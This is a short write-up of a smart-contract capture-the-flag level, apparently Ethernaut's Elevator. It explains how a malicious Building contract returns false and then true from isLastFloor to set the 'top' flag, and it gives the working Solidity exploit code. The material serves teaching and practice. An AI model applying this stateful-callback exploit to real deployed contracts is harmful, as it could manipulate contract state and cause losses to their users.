The goal of this level is to set the `top` variable to true. The contract expects to be called from a `Building` contract which implements an `isLastFloor` method. In the `goTo` method we check `isLastFloor`, if it is not the last floor then we proceed to update the floor to the provided argument and set `top` to the result of calling `isLastFloor` a second time. Given that we control this `isLastFloor` function, we can simply make it return false the first time, and true the second time, therefore bypassing the check and setting `top` to true.

The prototype of the `isLastFloor` specified in the interface defines the function as `view`, which means it should be read-only. However as functions are specified by the first 4 bytes of the hash of their prototype, _excluding_ modifiers, we will call the same function whether the interface specifies `view` or any other modifier.

Exploit code:
```solidity
pragma solidity ^0.4.18;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool wasCalled;
    
    // Fallback
    function() public payable {
        address instance = 0xb96539e1Fb96d6d97fE87742C6dAf2eE4F0276aA;
        Elevator(instance).goTo(0);
    }
    
    function isLastFloor(uint) public returns (bool) {
        if (!wasCalled) {
            wasCalled = true;
            return false;
        }
        else {
            return true;
        }
    }
}
```
